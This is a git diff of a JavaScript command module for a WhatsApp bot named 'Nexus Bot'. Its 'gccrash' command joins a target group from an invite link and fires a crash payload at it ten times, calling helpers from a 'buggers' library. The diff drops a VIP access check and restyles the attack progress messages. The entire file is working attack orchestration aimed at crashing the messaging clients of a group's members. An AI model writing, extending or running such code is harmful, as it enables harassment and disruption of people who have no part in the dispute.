@@ -1,6 +1,3 @@
-import { VIPQueries } from "../../database/query.js"
-import { VIPHelper } from "../../whatsapp/index.js"
-
 export default {
   name: "gccrash",
   commands: ["gccrash", "gcc", "gcrash"],
@@ -11,83 +8,68 @@ export default {
   
   async execute(sock, sessionId, args, m) {
     try {
-    /*  const userTelegramId = VIPHelper.fromSessionId(sessionId)
-      if (!userTelegramId) {
-        await sock.sendMessage(m.chat, { text: "❌ Session error\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
-        return
-      }
-
-      const vipStatus = await VIPQueries.isVIP(userTelegramId)
-      if (!vipStatus.isVIP) {
-        await sock.sendMessage(m.chat, { text: "❌ VIP access required\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
-        return
-      }*/
-
       if (!args || args.length === 0) {
         await sock.sendMessage(m.chat, { 
-          text: "❌ Usage: .gccrash <group_link>\nExample: .gccrash https://chat.whatsapp.com/xxxxx\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
+          text: "❌ 𝐔𝐬𝐚𝐠𝐞: .gccrash <group_link>\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: .gccrash https://chat.whatsapp.com/xxxxx\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
         }, { quoted: m })
         return
       }
 
       const groupLink = args.join(' ')
-      
-      // Extract group code from link
       const groupCodeMatch = groupLink.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)
       
       if (!groupCodeMatch) {
-        await sock.sendMessage(m.chat, { text: "❌ Invalid group link\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+        await sock.sendMessage(m.chat, { 
+          text: "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
+        }, { quoted: m })
         return
       }
 
       const groupCode = groupCodeMatch[1]
       
+      // Send initial message
       let statusMsg = await sock.sendMessage(m.chat, { 
-        text: `👥 *GROUP CRASH ATTACK*\n\n🔍 Checking group membership...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
+        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n🔍 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐠𝐫𝐨𝐮𝐩 𝐚𝐜𝐜𝐞𝐬𝐬...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
       }, { quoted: m })
 
       let groupId = null
       let groupName = null
-      let alreadyInGroup = false
 
-      // Method 1: Try to get group info directly from invite code
       try {
-        await sock.sendMessage(m.chat, { 
-          text: `👥 *GROUP CRASH ATTACK*\n\n📡 Getting group info from invite code...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        // Edit the message
+        await sock.sendMessage(m.chat, {
+          text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n📡 𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐠𝐫𝐨𝐮𝐩 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
           edit: statusMsg.key
         })
 
         const groupInfo = await sock.groupGetInviteInfo(groupCode)
         groupName = groupInfo.subject
         
-        // Now try to find this group in our groups list by name
         const groups = await sock.groupFetchAllParticipating()
         
         for (const [id, group] of Object.entries(groups)) {
           if (group.subject === groupName) {
             groupId = id
-            alreadyInGroup = true
             break
           }
         }
 
         if (groupId) {
-          await sock.sendMessage(m.chat, { 
-            text: `👥 *GROUP CRASH ATTACK*\n\n✅ Already in group: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+          await sock.sendMessage(m.chat, {
+            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n✅ 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
             edit: statusMsg.key
           })
           await new Promise(resolve => setTimeout(resolve, 1000))
         } else {
-          // Not in group - try to join
-          await sock.sendMessage(m.chat, { 
-            text: `👥 *GROUP CRASH ATTACK*\n\n📥 Joining group: ${groupName}...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+          await sock.sendMessage(m.chat, {
+            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n📥 𝐉𝐨𝐢𝐧𝐢𝐧𝐠 𝐠𝐫𝐨𝐮𝐩: ${groupName}...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
             edit: statusMsg.key
           })
           
           try {
             groupId = await sock.groupAcceptInvite(groupCode)
-            await sock.sendMessage(m.chat, { 
-              text: `👥 *GROUP CRASH ATTACK*\n\n✅ Successfully joined: ${groupName}\n⏳ Waiting 2 seconds...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+            await sock.sendMessage(m.chat, {
+              text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐣𝐨𝐢𝐧𝐞𝐝: ${groupName}\n⏳ 𝐖𝐚𝐢𝐭𝐢𝐧𝐠 𝟐 𝐬𝐞𝐜𝐨𝐧𝐝𝐬...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
               edit: statusMsg.key
             })
             await new Promise(resolve => setTimeout(resolve, 2000))
@@ -95,20 +77,15 @@ export default {
             const errorMsg = joinError.message || joinError.toString()
             
             if (errorMsg.includes('already') || errorMsg.includes('participant') || joinError.output?.statusCode === 409) {
-              // We're already in the group but couldn't find it by name - use groupGetInviteInfo result
-              await sock.sendMessage(m.chat, { 
-                text: `👥 *GROUP CRASH ATTACK*\n\n⚠️ Already in group but could not locate in list\n📝 Using group info from invite...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+              await sock.sendMessage(m.chat, {
+                text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n⚠️ 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩, 𝐥𝐨𝐜𝐚𝐭𝐢𝐧𝐠...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                 edit: statusMsg.key
               })
               
-              // For already-in-group case, we need to find the actual group ID
-              // Try alternative method to get group ID
               try {
-                // Get updated groups list
                 const updatedGroups = await sock.groupFetchAllParticipating()
                 let found = false
                 
-                // Search by name more broadly
                 for (const [id, group] of Object.entries(updatedGroups)) {
                   if (group.subject && group.subject.includes(groupName.substring(0, 10))) {
                     groupId = id
@@ -119,25 +96,24 @@ export default {
                 }
                 
                 if (!found) {
-                  // Last resort: try to get ID from group metadata
-                  throw new Error("Could not locate group ID")
+                  throw new Error("𝐂𝐨𝐮𝐥𝐝 𝐧𝐨𝐭 𝐥𝐨𝐜𝐚𝐭𝐞 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃")
                 }
                 
-                await sock.sendMessage(m.chat, { 
-                  text: `👥 *GROUP CRASH ATTACK*\n\n✅ Located group: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+                await sock.sendMessage(m.chat, {
+                  text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n✅ 𝐋𝐨𝐜𝐚𝐭𝐞𝐝 𝐠𝐫𝐨𝐮𝐩: ${groupName}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                   edit: statusMsg.key
                 })
                 
               } catch (findError) {
-                await sock.sendMessage(m.chat, { 
-                  text: `❌ Could not determine group ID. Please make sure the bot is in the group and try again.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+                await sock.sendMessage(m.chat, {
+                  text: `❌ 𝐂𝐨𝐮𝐥𝐝 𝐧𝐨𝐭 𝐝𝐞𝐭𝐞𝐫𝐦𝐢𝐧𝐞 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                   edit: statusMsg.key
                 })
                 return
               }
             } else {
-              await sock.sendMessage(m.chat, { 
-                text: `❌ Failed to join group: ${errorMsg}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+              await sock.sendMessage(m.chat, {
+                text: `❌ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐣𝐨𝐢𝐧 𝐠𝐫𝐨𝐮𝐩: ${errorMsg}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
                 edit: statusMsg.key
               })
               return
@@ -145,9 +121,8 @@ export default {
           }
         }
       } catch (infoError) {
-        // Fallback: Try direct join without group info
-        await sock.sendMessage(m.chat, { 
-          text: `👥 *GROUP CRASH ATTACK*\n\n📥 Attempting direct join...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        await sock.sendMessage(m.chat, {
+          text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n📥 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐢𝐧𝐠 𝐝𝐢𝐫𝐞𝐜𝐭 𝐣𝐨𝐢𝐧...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
           edit: statusMsg.key
         })
         
@@ -156,125 +131,89 @@ export default {
           const groupMetadata = await sock.groupMetadata(groupId)
           groupName = groupMetadata.subject
           
-          await sock.sendMessage(m.chat, { 
-            text: `👥 *GROUP CRASH ATTACK*\n\n✅ Successfully joined: ${groupName}\n⏳ Waiting 2 seconds...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+          await sock.sendMessage(m.chat, {
+            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐣𝐨𝐢𝐧𝐞𝐝: ${groupName}\n⏳ 𝐖𝐚𝐢𝐭𝐢𝐧𝐠 𝟐 𝐬𝐞𝐜𝐨𝐧𝐝𝐬...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
             edit: statusMsg.key
           })
           await new Promise(resolve => setTimeout(resolve, 2000))
         } catch (joinError) {
-          const errorMsg = joinError.message || joinError.toString()
-          
-          if (errorMsg.includes('already') || errorMsg.includes('participant') || joinError.output?.statusCode === 409) {
-            await sock.sendMessage(m.chat, { 
-              text: `❌ Already in group but could not locate it. Please ensure:\n• Bot is in the group\n• Group link is valid\n• Try using .gcinfo command first\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
-              edit: statusMsg.key
-            })
-          } else {
-            await sock.sendMessage(m.chat, { 
-              text: `❌ Invalid group link or access denied: ${errorMsg}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
-              edit: statusMsg.key
-            })
-          }
+          await sock.sendMessage(m.chat, {
+            text: `❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤 𝐨𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐝𝐞𝐧𝐢𝐞𝐝\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+            edit: statusMsg.key
+          })
           return
         }
       }
 
-      // Verify we have groupId before proceeding
       if (!groupId) {
-        await sock.sendMessage(m.chat, { 
-          text: "❌ Could not determine group ID\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙",
+        await sock.sendMessage(m.chat, {
+          text: "❌ 𝐂𝐨𝐮𝐥𝐝 𝐧𝐨𝐭 𝐝𝐞𝐭𝐞𝐫𝐦𝐢𝐧𝐞 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙",
           edit: statusMsg.key
         })
         return
       }
 
-      // Final verification - get group metadata
       try {
         const finalMetadata = await sock.groupMetadata(groupId)
         groupName = finalMetadata.subject
         
-        await sock.sendMessage(m.chat, { 
-          text: `👥 *GROUP CRASH ATTACK*\n\n🎯 Target Confirmed:\n📛 Name: ${groupName}\n🆔 ID: ${groupId}\n\n💣 Preparing attacks...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        await sock.sendMessage(m.chat, {
+          text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* ${groupName}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* 𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠...\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
           edit: statusMsg.key
         })
       } catch (metaError) {
-        await sock.sendMessage(m.chat, { 
-          text: `❌ Cannot access group metadata. Bot may have been removed.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        await sock.sendMessage(m.chat, {
+          text: `❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐚𝐜𝐜𝐞𝐬𝐬 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐭𝐚𝐝𝐚𝐭𝐚\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
           edit: statusMsg.key
         })
         return
       }
 
-      // Import bug functions only when needed 
-      const { sendNewsletterCrash } = await import("../../lib/buggers/bug.js")
+      const { newsletterBvgCombo } = await import("../../lib/buggers/bug.js")
 
-      let progress = `👥 *GROUP CRASH ATTACK*\n\n🎯 Group: ${groupName}\n📱 ID: ${groupId}\n\n📊 *Progress:*\n\n`
-
-      await sock.sendMessage(m.chat, { 
-        text: progress + `💣 Initializing attacks...`,
-        edit: statusMsg.key
-      })
-
-      const bugs = [
-          { name: 'sendNewsletterCrash', fn: () => sendNewsletterCrash(sock, groupId), count: 10 }
-        
+      const totalBugs = 10
+      const progressSteps = [
+        { percent: 10, bar: "《 █▒▒▒▒▒▒▒▒▒▒▒》10%" },
+        { percent: 20, bar: "《 ██▒▒▒▒▒▒▒▒▒▒》20%" },
+        { percent: 30, bar: "《 ████▒▒▒▒▒▒▒▒》30%" },
+        { percent: 40, bar: "《 █████▒▒▒▒▒▒▒》40%" },
+        { percent: 50, bar: "《 ███████▒▒▒▒▒》50%" },
+        { percent: 60, bar: "《 ████████▒▒▒▒》60%" },
+        { percent: 70, bar: "《 █████████▒▒▒》70%" },
+        { percent: 80, bar: "《 ██████████▒▒》80%" },
+        { percent: 90, bar: "《 ███████████▒》90%" },
+        { percent: 100, bar: "《 ████████████》100%" }
       ]
 
-      let totalWaves = 0
-      let successCount = 0
-
-      for (const bug of bugs) {
-        progress += `🔄 ${bug.name}: `
-        
-        for (let i = 0; i < bug.count; i++) {
-          try {
-            const sentMsg = await bug.fn()
-            
-            // Delete message for myself only
-            if (sentMsg && sentMsg.key) {
-              try {
-                await sock.chatModify(
-                  { 
-                    clear: { 
-                      messages: [{ id: sentMsg.key.id, fromMe: true }] 
-                    } 
-                  }, 
-                  groupId
-                )
-              } catch (deleteError) {
-                // Silent fail for delete errors
-              }
-            }
-            
-            progress += `✓ `
-            totalWaves++
-            successCount++
-          } catch (bugError) {
-            progress += `✗ `
-            // Continue with next iteration even if one bug fails
-          }
-          await new Promise(resolve => setTimeout(resolve, 200))
+      for (let i = 0; i < totalBugs; i++) {
+        try {
+          await newsletterBvgCombo(sock, groupId, false)
+          
+          const currentPercent = Math.floor(((i + 1) / totalBugs) * 100)
+          const currentStep = progressSteps.find(step => step.percent >= currentPercent) || progressSteps[progressSteps.length - 1]
+          
+          await sock.sendMessage(m.chat, {
+            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* ${groupName}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡\n> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* ${currentStep.bar}\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠 𝐩𝐚𝐲𝐥𝐨𝐚𝐝...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+            edit: statusMsg.key
+          })
+          
+          await new Promise(resolve => setTimeout(resolve, 500))
+        } catch (bugError) {
+          console.error("[GcCrash] Bug error:", bugError)
         }
-        
-        progress += `(${bug.count}/${bug.count})\n`
-        
-        await sock.sendMessage(m.chat, { 
-          text: progress,
-          edit: statusMsg.key
-        })
       }
 
-      progress += `\n✅ Attack completed on ${groupName}\n📦 Total waves: ${totalWaves}\n🎯 Success rate: ${successCount}/${totalWaves}`
-
-      await sock.sendMessage(m.chat, { 
-        text: progress,
+      await sock.sendMessage(m.chat, {
+        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* ${groupName}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐆𝐂 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* ✅\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐭 𝐭𝐨 𝐭𝐚𝐫𝐠𝐞𝐭\n\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
         edit: statusMsg.key
       })
 
       return { success: true }
     } catch (error) {
       console.error("[GcCrash] Error:", error)
-      await sock.sendMessage(m.chat, { text: `❌ Attack failed: ${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` }, { quoted: m })
+      await sock.sendMessage(m.chat, { 
+        text: `❌ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐟𝐚𝐢𝐥𝐞𝐝: ${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
+      }, { quoted: m })
       return { success: false }
     }
   }
